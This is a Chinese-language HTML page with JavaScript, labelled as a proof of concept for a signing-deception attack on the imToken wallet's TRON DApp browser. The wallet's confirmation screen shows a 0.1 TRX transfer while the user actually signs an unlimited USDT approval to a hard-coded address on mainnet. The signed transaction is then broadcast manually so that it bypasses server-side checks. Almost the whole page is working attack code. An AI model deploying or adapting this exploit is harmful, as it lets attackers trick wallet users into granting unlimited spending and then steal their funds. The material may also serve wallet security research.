<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>所见非所签 PoC – TRX 皮 USDT 心</title>
  <style>
    :root { --bg: #0b0f14; --card: #131a22; --border: #253040; --text: #e1e6ed; --text2: #8899aa; --red: #f04343; --green: #2ecc71; --orange: #e6a23c; --blue: #4d94ff; }
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { background: var(--bg); color: var(--text); font-family: -apple-system, BlinkMacSystemFont, sans-serif; padding: 16px; display: flex; flex-direction: column; gap: 14px; }
    .card { background: var(--card); border: 1px solid var(--border); border-radius: 14px; padding: 18px; }
    .card-header { font-weight: 600; font-size: 15px; margin-bottom: 12px; display: flex; align-items: center; gap: 8px; }
    .dot { width: 9px; height: 9px; border-radius: 50%; display: inline-block; }
    .dot.red { background: var(--red); } .dot.green { background: var(--green); } .dot.orange { background: var(--orange); }
    .row { display: flex; justify-content: space-between; padding: 6px 0; font-size: 13px; border-bottom: 1px solid rgba(255,255,255,0.05); }
    .label { color: var(--text2); min-width: 85px; }
    .value { text-align: right; word-break: break-all; font-family: monospace; font-size: 12px; }
    .btn { width: 100%; padding: 14px 0; border-radius: 10px; border: none; font-size: 15px; font-weight: 600; cursor: pointer; margin-top: 10px; }
    .btn-connect { background: var(--green); color: #000; }
    .btn-attack { background: #e64343; color: #fff; }
    .btn-check { background: var(--blue); color: #fff; }
    .log-box { background: #090d13; border: 1px solid var(--border); border-radius: 10px; padding: 10px; font-family: monospace; font-size: 11px; max-height: 380px; overflow-y: auto; color: #aab5c0; margin-top: 8px; }
    .log-line { padding: 2px 0; }
    .log-error { color: var(--red); }
    .log-success { color: var(--green); }
    .log-warn { color: var(--orange); }
  </style>
</head>
<body>

<div class="card">
  <div class="card-header"><span class="dot red"></span> 所见非所签攻击</div>
  <div style="font-size:13px; color:var(--text2); line-height:1.6;">
    钱包确认页 → <b style="color:#4d94ff;">向 TEfFnhxxeRbghthqJ4dSbAK4mqAtkJbSAz 转账 0.1 TRX</b><br>
    实际链上执行 → <b style="color:#f04343;">USDT 无限额度授权（2^256-1）</b><br>
    利用 <code>tron.signTransaction</code> + 手动广播 绕过服务端拦截
  </div>
</div>

<div class="card">
  <div class="card-header"><span class="dot orange" id="dotStatus"></span> 钱包状态</div>
  <div id="beforeConnect">
    <div class="row"><span class="label">状态</span><span class="value">未连接</span></div>
    <button class="btn btn-connect" id="btnConnect">连接 imToken 钱包</button>
  </div>
  <div id="afterConnect" style="display:none;">
    <div class="row"><span class="label">地址</span><span class="value" id="addrText"></span></div>
    <div class="row"><span class="label">TRX</span><span class="value" id="trxBal"></span></div>
    <button class="btn btn-attack" id="btnAttack">💣 发起攻击（显示转账，签署授权）</button>
    <button class="btn btn-check" id="btnCheck">📊 查询 USDT 授权额度</button>
  </div>
</div>

<div class="card" id="allowanceCard" style="display:none;">
  <div class="card-header"><span class="dot orange"></span> USDT 授权额度（对 TEfFnhxxeRbghthqJ4dSbAK4mqAtkJbSAz）</div>
  <div class="row"><span class="label">当前授权</span><span class="value" id="currentAllowance">--</span></div>
</div>

<div class="card">
  <div class="card-header"><span class="dot orange"></span> 运行日志</div>
  <div class="log-box" id="logContainer">等待操作…</div>
</div>

<script>
(function() {
  const USDT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
  const SPENDER = 'TEfFnhxxeRbghthqJ4dSbAK4mqAtkJbSAz';
  const APPROVE_MAX = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
  const TRON_API = 'https://api.trongrid.io';

  let wallet = '', tronWeb = null;
  const $ = id => document.getElementById(id);
  function log(msg, cls) {
    const d = document.createElement('div');
    d.className = 'log-line' + (cls ? ' log-'+cls : '');
    d.textContent = '['+new Date().toLocaleTimeString()+'] ' + msg;
    $('logContainer').appendChild(d);
    $('logContainer').scrollTop = $('logContainer').scrollHeight;
  }
  const ok = () => typeof imToken !== 'undefined' && imToken.callPromisifyAPI;

  // 连接
  async function connect() {
    if (!ok()) return log('请在 imToken DApp 浏览器中打开', 'error');
    for (let i=0;i<10;i++) { if (window.tronWeb?.ready) break; await new Promise(r=>setTimeout(r,600)); }
    if (window.tronWeb?.ready) {
      tronWeb = window.tronWeb;
      wallet = tronWeb.defaultAddress.base58;
    } else {
      try {
        const acc = await imToken.callPromisifyAPI('tron_requestAccounts');
        wallet = Array.isArray(acc) && acc.length ? acc[0] : acc;
      } catch(e) { log('获取地址失败: '+e.message,'error'); return; }
    }
    if (!wallet || wallet.length!==34) return log('地址无效','error');
    $('addrText').textContent = wallet;
    try {
      const r = await fetch(TRON_API+'/v1/accounts/'+wallet);
      const d = await r.json();
      $('trxBal').textContent = ((d.data?.[0]?.balance||0)/1e6).toFixed(2)+' TRX';
    } catch(_){ $('trxBal').textContent = '--'; }
    $('dotStatus').className = 'dot green';
    $('beforeConnect').style.display = 'none';
    $('afterConnect').style.display = 'block';
    log('已连接 '+wallet,'success');
    await checkAllowance();
  }

  // 查询授权
  async function queryAllowance() {
    try {
      const h = tronWeb.address.toHex;
      const {constant_result} = await tronWeb.transactionBuilder.triggerConstantContract(
        h(USDT), 'allowance(address,address)', {},
        [{type:'address',value:wallet},{type:'address',value:SPENDER}], h(wallet)
      );
      return constant_result?.[0] ? BigInt('0x'+constant_result[0]) : null;
    } catch(e) { log('查询 allowance 失败: '+e.message,'error'); return null; }
  }
  async function checkAllowance() {
    if (!wallet) return;
    const al = await queryAllowance();
    $('currentAllowance').textContent = al==null ? '查询失败' : (al>0n ? al.toString() + ' (已授权!)' : '0 (未授权)');
    $('allowanceCard').style.display = 'block';
  }

  // 核心攻击
  async function attack() {
    if (!wallet || !tronWeb) return log('请先连接钱包','error');
    log('⚙️ 构造攻击负载...');
    try {
      const h = tronWeb.address.toHex;
      const userHex = h(wallet), targetHex = h(SPENDER), contractHex = h(USDT);

      // 1. 生成真实授权交易，拿到完整对象（含 raw_data_hex）
      const { transaction, result } = await tronWeb.transactionBuilder.triggerSmartContract(
        contractHex, 'approve(address,uint256)',
        { feeLimit:100_000_000, callValue:0 },
        [{type:'address',value:SPENDER}, {type:'uint256',value:APPROVE_MAX}],
        userHex
      );
      if (!result?.result) return log('授权交易构造失败','error');
      const realHex = transaction.raw_data_hex;
      log(`🔐 真实 raw_data_hex 已生成 (选择器: ${realHex.includes('095ea7b3')?'✅存在':'❌缺失'})`, 'success');

      // 2. 构造假 raw_data —— 仅 0.1 TRX 转账
      const fakeContract = {
        type_url: 'type.googleapis.com/protocol.TransferContract',
        parameter: {
          type_url: 'type.googleapis.com/protocol.TransferContract',
          value: { amount: 100000, owner_address: userHex, to_address: targetHex }
        }
      };
      // 替换合约数组，但保留真实的区块信息
      transaction.raw_data.contract = [fakeContract];
      // 注意：raw_data_hex 保持不变，它的合约仍然是 approve

      log('🎭 假 raw_data 已注入（仅转账），raw_data_hex 仍为 approve');

      // 3. 调用 tron.signTransaction —— 关键步骤
      log('📡 调用 tron.signTransaction，弹出确认页...', 'warn');
      let signedResult;
      try {
        // 使用与 sendTransaction 相同的参数格式
        signedResult = await imToken.callPromisifyAPI('tron.signTransaction', {
          tx: transaction,      // 修改后的交易对象
          from: wallet,
          useTronHeader: true
        });
      } catch (e) {
        log('signTransaction 调用失败: '+e.message, 'error');
        // 尝试另一种格式：直接传交易对象
        log('尝试直接传递交易对象...', 'warn');
        signedResult = await imToken.callPromisifyAPI('tron.signTransaction', transaction);
      }

      log('签名返回原始数据: ' + JSON.stringify(signedResult), 'warn');

      // 4. 提取签名后的 hex 字符串
      let signedHex = '';
      if (typeof signedResult === 'string') {
        signedHex = signedResult;
      } else if (signedResult && typeof signedResult === 'object') {
        signedHex = signedResult.signedTransaction || signedResult.transaction || signedResult.txID || '';
        // 有些版本返回完整交易对象，需要序列化
        if (!signedHex && signedResult.signature && signedResult.raw_data) {
          try {
            signedHex = tronWeb.utils.transaction.txPbToRawData(signedResult);
          } catch (_) {
            log('⚠️ 无法序列化签名对象，尝试手动构造', 'warn');
          }
        }
      }
      if (!signedHex || typeof signedHex !== 'string') {
        log('❌ 未能提取签名 hex，请截图以上返回信息并手动分析', 'error');
        return;
      }
      log('✍️ 签名提取成功，前缀: ' + signedHex.substring(0,50) + '...', 'success');

      // 5. 手动广播
      log('📡 广播交易到 TRON 网络...', 'warn');
      const broad = await tronWeb.trx.sendRawTransaction(signedHex);
      log('✅ 广播成功！结果: ' + JSON.stringify(broad), 'success');
      if (broad?.txid || broad?.txID || broad?.result) {
        const txid = broad.txid || broad.txID || broad.result;
        log('🔗 TXID: ' + txid, 'success');
        log('🌐 https://tronscan.org/#/transaction/' + txid);
        log('⏳ 12 秒后请查询授权额度验证攻击效果。');
        setTimeout(checkAllowance, 12000);
      }
    } catch(e) {
      log('💥 攻击出错: ' + (e.message||JSON.stringify(e)), 'error');
    }
  }

  $('btnConnect').addEventListener('click', connect);
  $('btnAttack').addEventListener('click', attack);
  $('btnCheck').addEventListener('click', checkAllowance);

  if (ok()) log('imToken 桥接就绪', 'success');
  else log('请在 imToken DApp 浏览器中打开', 'warn');
})();
</script>
</body>
</html>
